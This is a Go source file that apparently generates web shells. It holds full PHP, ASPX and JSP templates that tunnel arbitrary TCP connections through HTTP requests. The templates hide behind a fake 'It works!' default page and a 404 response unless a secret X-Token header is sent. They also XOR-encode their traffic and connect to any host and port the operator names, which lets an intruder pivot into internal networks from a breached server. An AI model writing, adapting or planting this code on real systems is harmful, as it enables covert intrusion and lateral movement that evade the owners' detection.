package webshell

// Templates use __KEY_HEX__ and __AUTH_HEX__ as placeholders,
// replaced at generation time via strings.ReplaceAll.

// phpTemplate implements the HTTP tunnel protocol in PHP 5.6+.
// Uses pfsockopen() for persistent connections across requests within
// the same PHP-FPM/mod_php worker process. Session metadata (target
// host:port) is stored in temp files keyed by session ID.
const phpTemplate = `<?php
$k = hex2bin('__KEY_HEX__');
$a = '__AUTH_HEX__';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><title>Welcome</title></head>';
    echo '<body><h1>It works!</h1><p>The web server software is running but no content has been added yet.</p></body></html>';
    exit;
}

$t = isset($_SERVER['HTTP_X_TOKEN']) ? $_SERVER['HTTP_X_TOKEN'] : '';
if ($t !== $a) {
    http_response_code(404);
    echo 'Not Found';
    exit;
}

function xc($d, $k) {
    $o = '';
    $l = strlen($k);
    for ($i = 0; $i < strlen($d); $i++) {
        $o .= $d[$i] ^ $k[$i % $l];
    }
    return $o;
}

function dp($b, $k) {
    $r = base64_decode($b, true);
    if ($r === false) return false;
    return xc($r, $k);
}

function ep($d, $k) {
    return base64_encode(xc($d, $k));
}

$sd = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.s' . substr($a, 0, 8);
if (!is_dir($sd)) @mkdir($sd, 0700, true);

$c = isset($_GET['cmd']) ? $_GET['cmd'] : '';

switch ($c) {
case 'connect':
    $tgt = isset($_GET['target']) ? $_GET['target'] : '';
    if (!$tgt) { http_response_code(400); exit; }
    $p = strrpos($tgt, ':');
    if ($p === false) { http_response_code(400); exit; }
    $h = substr($tgt, 0, $p);
    $pt = (int)substr($tgt, $p + 1);
    $s = @pfsockopen($h, $pt, $en, $es, 10);
    if (!$s) { http_response_code(502); exit; }
    stream_set_blocking($s, false);
    if (function_exists('random_bytes')) {
        $sid = bin2hex(random_bytes(8));
    } elseif (function_exists('openssl_random_pseudo_bytes')) {
        $sid = bin2hex(openssl_random_pseudo_bytes(8));
    } else {
        $sid = substr(md5(uniqid(mt_rand(), true)), 0, 16);
    }
    @file_put_contents($sd . DIRECTORY_SEPARATOR . $sid, $tgt);
    $r = json_encode(array('sid' => $sid));
    header('Content-Type: application/octet-stream');
    echo ep($r, $k);
    break;

case 'send':
    $sid = isset($_GET['sid']) ? $_GET['sid'] : '';
    if (!preg_match('/^[a-f0-9]+$/', $sid)) { http_response_code(404); exit; }
    $tgt = @file_get_contents($sd . DIRECTORY_SEPARATOR . $sid);
    if (!$tgt) { http_response_code(404); exit; }
    $p = strrpos($tgt, ':');
    $s = @pfsockopen(substr($tgt, 0, $p), (int)substr($tgt, $p + 1), $en, $es, 5);
    if (!$s) { http_response_code(502); exit; }
    stream_set_blocking($s, true);
    $body = file_get_contents('php://input');
    $data = dp($body, $k);
    if ($data !== false) @fwrite($s, $data);
    break;

case 'recv':
    $sid = isset($_GET['sid']) ? $_GET['sid'] : '';
    if (!preg_match('/^[a-f0-9]+$/', $sid)) { http_response_code(404); exit; }
    $tgt = @file_get_contents($sd . DIRECTORY_SEPARATOR . $sid);
    if (!$tgt) { http_response_code(404); exit; }
    $p = strrpos($tgt, ':');
    $s = @pfsockopen(substr($tgt, 0, $p), (int)substr($tgt, $p + 1), $en, $es, 5);
    if (!$s) { http_response_code(502); exit; }
    stream_set_blocking($s, false);
    $r = array($s); $w = null; $e = null;
    if (@stream_select($r, $w, $e, 0, 100000) > 0) {
        $buf = @fread($s, 32768);
        if ($buf !== false && strlen($buf) > 0) {
            header('Content-Type: application/octet-stream');
            echo ep($buf, $k);
        }
    }
    break;

case 'disconnect':
    $sid = isset($_GET['sid']) ? $_GET['sid'] : '';
    if (!preg_match('/^[a-f0-9]+$/', $sid)) break;
    $f = $sd . DIRECTORY_SEPARATOR . $sid;
    $tgt = @file_get_contents($f);
    if ($tgt) {
        $p = strrpos($tgt, ':');
        $s = @pfsockopen(substr($tgt, 0, $p), (int)substr($tgt, $p + 1), $en, $es, 2);
        if ($s) @fclose($s);
    }
    @unlink($f);
    break;

case 'ping':
    echo 'pong';
    break;

default:
    http_response_code(404);
    break;
}
`

// aspxTemplate implements the HTTP tunnel protocol in C# for ASP.NET (.NET 4.0+).
// Uses static fields for session storage (persists across requests in the same AppDomain).
// TcpClient objects are stored in a synchronized Hashtable.
const aspxTemplate = `<%@ Page Language="C#" AutoEventWireup="true" ValidateRequest="false" EnableViewState="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Collections" %>
<script runat="server">
    static readonly byte[] _k = Hd("__KEY_HEX__");
    static readonly string _a = "__AUTH_HEX__";
    static Hashtable _ss;
    static readonly object _lk = new object();

    static byte[] Hd(string h) {
        byte[] b = new byte[h.Length / 2];
        for (int i = 0; i < b.Length; i++)
            b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
        return b;
    }

    static byte[] Xor(byte[] d, byte[] k) {
        byte[] o = new byte[d.Length];
        for (int i = 0; i < d.Length; i++)
            o[i] = (byte)(d[i] ^ k[i % k.Length]);
        return o;
    }

    static byte[] Dec(string b64) {
        return Xor(Convert.FromBase64String(b64), _k);
    }

    static string Enc(byte[] d) {
        return Convert.ToBase64String(Xor(d, _k));
    }

    static Hashtable Sessions() {
        if (_ss == null) {
            lock (_lk) {
                if (_ss == null)
                    _ss = Hashtable.Synchronized(new Hashtable());
            }
        }
        return _ss;
    }

    protected void Page_Load(object sender, EventArgs e) {
        Response.Clear();

        if (Request.HttpMethod == "GET") {
            Response.ContentType = "text/html; charset=utf-8";
            Response.Write("<!DOCTYPE html><html><head><title>Welcome</title></head>");
            Response.Write("<body><h1>It works!</h1><p>The web server software is running but no content has been added yet.</p></body></html>");
            return;
        }

        string token = Request.Headers["X-Token"] ?? "";
        if (token != _a) {
            Response.StatusCode = 404;
            Response.Write("Not Found");
            return;
        }

        string cmd = Request.QueryString["cmd"] ?? "";

        switch (cmd) {
        case "connect":
            string target = Request.QueryString["target"] ?? "";
            if (string.IsNullOrEmpty(target)) { Response.StatusCode = 400; return; }
            int ci = target.LastIndexOf(':');
            if (ci < 0) { Response.StatusCode = 400; return; }
            string ch = target.Substring(0, ci);
            int cp = int.Parse(target.Substring(ci + 1));
            TcpClient cc;
            try {
                cc = new TcpClient();
                cc.Connect(ch, cp);
            } catch {
                Response.StatusCode = 502;
                return;
            }
            byte[] sb = new byte[8];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider()) {
                rng.GetBytes(sb);
            }
            string sid = BitConverter.ToString(sb).Replace("-", "").ToLower();
            Sessions()[sid] = cc;
            byte[] jr = Encoding.UTF8.GetBytes("{\"sid\":\"" + sid + "\"}");
            Response.ContentType = "application/octet-stream";
            Response.Write(Enc(jr));
            break;

        case "send":
            string ssid = Request.QueryString["sid"] ?? "";
            TcpClient sc = Sessions()[ssid] as TcpClient;
            if (sc == null) { Response.StatusCode = 404; return; }
            string sbody;
            using (StreamReader sr = new StreamReader(Request.InputStream, Encoding.ASCII)) {
                sbody = sr.ReadToEnd();
            }
            byte[] sdata = Dec(sbody);
            try {
                NetworkStream sns = sc.GetStream();
                sns.Write(sdata, 0, sdata.Length);
            } catch {
                Sessions().Remove(ssid);
                try { sc.Close(); } catch {}
                Response.StatusCode = 502;
            }
            break;

        case "recv":
            string rsid = Request.QueryString["sid"] ?? "";
            TcpClient rc = Sessions()[rsid] as TcpClient;
            if (rc == null) { Response.StatusCode = 404; return; }
            try {
                NetworkStream rns = rc.GetStream();
                rns.ReadTimeout = 100;
                byte[] rbuf = new byte[32768];
                int rn = rns.Read(rbuf, 0, rbuf.Length);
                if (rn > 0) {
                    byte[] rd = new byte[rn];
                    Array.Copy(rbuf, rd, rn);
                    Response.ContentType = "application/octet-stream";
                    Response.Write(Enc(rd));
                }
            } catch (IOException) {
            } catch {
                Sessions().Remove(rsid);
                try { rc.Close(); } catch {}
                Response.StatusCode = 502;
            }
            break;

        case "disconnect":
            string dsid = Request.QueryString["sid"] ?? "";
            if (!string.IsNullOrEmpty(dsid)) {
                TcpClient dc = Sessions()[dsid] as TcpClient;
                if (dc != null) {
                    Sessions().Remove(dsid);
                    try { dc.Close(); } catch {}
                }
            }
            break;

        case "ping":
            Response.Write("pong");
            break;

        default:
            Response.StatusCode = 404;
            break;
        }
    }
</script>
`

// jspTemplate implements the HTTP tunnel protocol in Java for Servlet containers (Java 8+).
// Uses ServletContext (application scope) for session storage via ConcurrentHashMap.
const jspTemplate = `<%@ page import="java.net.*,java.io.*,java.util.*,java.util.concurrent.*,java.security.*" contentType="text/html;charset=UTF-8" %><%!
    static final String KH = "__KEY_HEX__";
    static final String A = "__AUTH_HEX__";

    static byte[] hexDec(String h) {
        int l = h.length();
        byte[] d = new byte[l / 2];
        for (int i = 0; i < l; i += 2)
            d[i / 2] = (byte)((Character.digit(h.charAt(i), 16) << 4) + Character.digit(h.charAt(i + 1), 16));
        return d;
    }

    static String hexEnc(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte v : b) sb.append(String.format("%02x", v & 0xff));
        return sb.toString();
    }

    static byte[] xor(byte[] d, byte[] k) {
        byte[] o = new byte[d.length];
        for (int i = 0; i < d.length; i++) o[i] = (byte)(d[i] ^ k[i % k.length]);
        return o;
    }

    static byte[] dec(String b64, byte[] k) {
        return xor(java.util.Base64.getDecoder().decode(b64), k);
    }

    static String enc(byte[] d, byte[] k) {
        return java.util.Base64.getEncoder().encodeToString(xor(d, k));
    }

    @SuppressWarnings("unchecked")
    static ConcurrentHashMap<String, Socket> getSessions(ServletContext ctx) {
        ConcurrentHashMap<String, Socket> s = (ConcurrentHashMap<String, Socket>) ctx.getAttribute("_s");
        if (s == null) {
            synchronized (ctx) {
                s = (ConcurrentHashMap<String, Socket>) ctx.getAttribute("_s");
                if (s == null) {
                    s = new ConcurrentHashMap<String, Socket>();
                    ctx.setAttribute("_s", s);
                }
            }
        }
        return s;
    }
%><%
    byte[] K = hexDec(KH);

    if ("GET".equals(request.getMethod())) {
        response.setContentType("text/html; charset=utf-8");
        out.print("<!DOCTYPE html><html><head><title>Welcome</title></head>");
        out.print("<body><h1>It works!</h1><p>The web server software is running but no content has been added yet.</p></body></html>");
        return;
    }

    String token = request.getHeader("X-Token");
    if (token == null || !token.equals(A)) {
        response.setStatus(404);
        out.print("Not Found");
        return;
    }

    String cmd = request.getParameter("cmd");
    if (cmd == null) cmd = "";

    ConcurrentHashMap<String, Socket> sessions = getSessions(application);

    if ("connect".equals(cmd)) {
        String target = request.getParameter("target");
        if (target == null || target.isEmpty()) { response.setStatus(400); return; }
        int idx = target.lastIndexOf(':');
        if (idx < 0) { response.setStatus(400); return; }
        String host = target.substring(0, idx);
        int port = Integer.parseInt(target.substring(idx + 1));
        Socket sock;
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 10000);
        } catch (Exception ex) {
            response.setStatus(502);
            return;
        }
        byte[] sidBytes = new byte[8];
        new SecureRandom().nextBytes(sidBytes);
        String sid = hexEnc(sidBytes);
        sessions.put(sid, sock);
        String json = "{\"sid\":\"" + sid + "\"}";
        response.setContentType("application/octet-stream");
        out.print(enc(json.getBytes("UTF-8"), K));

    } else if ("send".equals(cmd)) {
        String sid = request.getParameter("sid");
        if (sid == null) { response.setStatus(404); return; }
        Socket sock = sessions.get(sid);
        if (sock == null) { response.setStatus(404); return; }
        StringBuilder body = new StringBuilder();
        BufferedReader reader = request.getReader();
        char[] cbuf = new char[8192];
        int n;
        while ((n = reader.read(cbuf)) != -1) body.append(cbuf, 0, n);
        byte[] data = dec(body.toString(), K);
        try {
            OutputStream os = sock.getOutputStream();
            os.write(data);
            os.flush();
        } catch (Exception ex) {
            sessions.remove(sid);
            try { sock.close(); } catch (Exception e2) {}
            response.setStatus(502);
        }

    } else if ("recv".equals(cmd)) {
        String sid = request.getParameter("sid");
        if (sid == null) { response.setStatus(404); return; }
        Socket sock = sessions.get(sid);
        if (sock == null) { response.setStatus(404); return; }
        try {
            sock.setSoTimeout(100);
            InputStream is = sock.getInputStream();
            byte[] buf = new byte[32768];
            int n = is.read(buf);
            if (n > 0) {
                byte[] data = new byte[n];
                System.arraycopy(buf, 0, data, 0, n);
                response.setContentType("application/octet-stream");
                out.print(enc(data, K));
            }
        } catch (SocketTimeoutException ste) {
        } catch (Exception ex) {
            sessions.remove(sid);
            try { sock.close(); } catch (Exception e2) {}
            response.setStatus(502);
        }

    } else if ("disconnect".equals(cmd)) {
        String sid = request.getParameter("sid");
        if (sid != null) {
            Socket sock = sessions.remove(sid);
            if (sock != null) { try { sock.close(); } catch (Exception e2) {} }
        }

    } else if ("ping".equals(cmd)) {
        out.print("pong");

    } else {
        response.setStatus(404);
    }
%>
`
